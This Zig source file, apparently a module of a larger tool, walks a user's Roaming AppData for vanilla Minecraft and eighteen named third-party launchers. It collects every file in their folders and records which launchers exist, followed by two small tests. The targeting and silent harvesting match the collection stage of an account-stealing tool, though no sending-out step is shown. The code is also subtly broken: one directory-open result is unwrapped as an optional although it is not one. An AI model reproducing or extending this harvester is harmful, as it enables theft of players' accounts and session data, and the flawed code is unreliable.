const std = @import("std");
const types = @import("../types/types.zig");
const engine = @import("../syscalls/engine.zig");
const file_io = @import("../parsers/file_io.zig");

pub const GameResult = struct {
    source_path: ?[]const u8,
    collected_files: [][]const u8,
    file_count: usize,
    launchers_found: []const []const u8,
};

const LauncherPaths = struct {
    name: []const u8,
    subdir: []const u8,
    relative: []const u8,
};

const launchers = [_]LauncherPaths{
    .{ .name = "TLauncher", .subdir = ".tlauncher", .relative = "minecraft" },
    .{ .name = "Lunar Client", .subdir = ".lunarclient", .relative = "offline" },
    .{ .name = "Feather", .subdir = ".feather", .relative = "minecraft" },
    .{ .name = "Badlion", .subdir = ".badlion", .relative = "minecraft" },
    .{ .name = "PolyMC", .subdir = "PolyMC", .relative = "minecraft" },
    .{ .name = "Prism", .subdir = "PrismLauncher", .relative = "minecraft" },
    .{ .name = "MultiMC", .subdir = "MultiMC", .relative = "minecraft" },
    .{ .name = "ATLauncher", .subdir = "ATLauncher", .relative = "minecraft" },
    .{ .name = "GDLauncher", .subdir = "GDLauncher", .relative = "minecraft" },
    .{ .name = "HMCL", .subdir = "HMCL", .relative = ".minecraft" },
    .{ .name = "SKlauncher", .subdir = "SKlauncher", .relative = "minecraft" },
    .{ .name = "Technic", .subdir = "technic", .relative = "minecraft" },
    .{ .name = "Crystal", .subdir = "crystal-launcher", .relative = "minecraft" },
    .{ .name = "Salwyrr", .subdir = "SalwyrrLauncher", .relative = "minecraft" },
    .{ .name = "Pojav", .subdir = "PojavLauncher", .relative = "minecraft" },
    .{ .name = "CKPack", .subdir = "ckpack", .relative = "minecraft" },
    .{ .name = "Novoline", .subdir = "novoline", .relative = "versions" },
    .{ .name = "MagicLauncher", .subdir = "MagicLauncher", .relative = "minecraft" },
};

fn collectDirectoryFiles(allocator: std.mem.Allocator, base: []const u8) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);

    var dir = std.fs.openDirAbsolute(base, .{}) catch return files.toOwnedSlice();
    defer dir.close();

    var iter = dir.iterate();
    while (iter.next() catch null) |entry| {
        if (entry.kind == .file) {
            const full = try std.fs.path.join(allocator, &[_][]const u8{ base, entry.name });
            try files.append(full);
        }
    }
    return files.toOwnedSlice();
}

pub fn collect(allocator: std.mem.Allocator, roaming_app_data: []const u8) !GameResult {
    const vanilla_path = try std.fs.path.join(allocator, &[_][]const u8{ roaming_app_data, ".minecraft" });
    defer allocator.free(vanilla_path);

    var all_files = std.ArrayList([]const u8).init(allocator);
    errdefer all_files.deinit();
    var found_launchers = std.ArrayList([]const u8).init(allocator);
    errdefer found_launchers.deinit();

    {
        var dir = std.fs.openDirAbsolute(vanilla_path, .{}) catch {};
        if (dir) |*d| {
            defer d.close();
            try found_launchers.append(try allocator.dupe(u8, "vanilla"));

            var iter = d.iterate();
            while (iter.next() catch null) |entry| {
                if (entry.kind == .file) {
                    const full = try std.fs.path.join(allocator, &[_][]const u8{ vanilla_path, entry.name });
                    try all_files.append(full);
                }
            }
        }
    }

    for (launchers) |l| {
        const launcher_path = try std.fs.path.join(allocator, &[_][]const u8{ roaming_app_data, l.subdir, l.relative });
        defer allocator.free(launcher_path);

        var dir = std.fs.openDirAbsolute(launcher_path, .{}) catch continue;
        defer dir.close();

        try found_launchers.append(try allocator.dupe(u8, l.name));

            var iter = dir.iterate();
            while (iter.next() catch null) |entry| {
                if (entry.kind == .file) {
                    const full = try std.fs.path.join(allocator, &[_][]const u8{ launcher_path, entry.name });
                    try all_files.append(full);
                }
            }
    }

    return GameResult{
        .source_path = try allocator.dupe(u8, vanilla_path),
        .file_count = all_files.items.len,
        .collected_files = try all_files.toOwnedSlice(),
        .launchers_found = try found_launchers.toOwnedSlice(),
    };
}

fn freeGameResult(result: GameResult, allocator: std.mem.Allocator) void {
    if (result.source_path) |p| allocator.free(p);
    for (result.collected_files) |f| allocator.free(f);
    allocator.free(result.collected_files);
    for (result.launchers_found) |l| allocator.free(l);
    allocator.free(result.launchers_found);
}

const testing = std.testing;

test "collect returns empty for nonexistent minecraft" {
    const result = try collect(testing.allocator, "C:\\__nonexistent__roaming");
    defer freeGameResult(result, testing.allocator);
    try testing.expectEqual(@as(usize, 0), result.file_count);
    try testing.expectEqual(@as(usize, 0), result.launchers_found.len);
}

test "launcher path definitions are valid" {
    try testing.expect(launchers.len > 10);
}
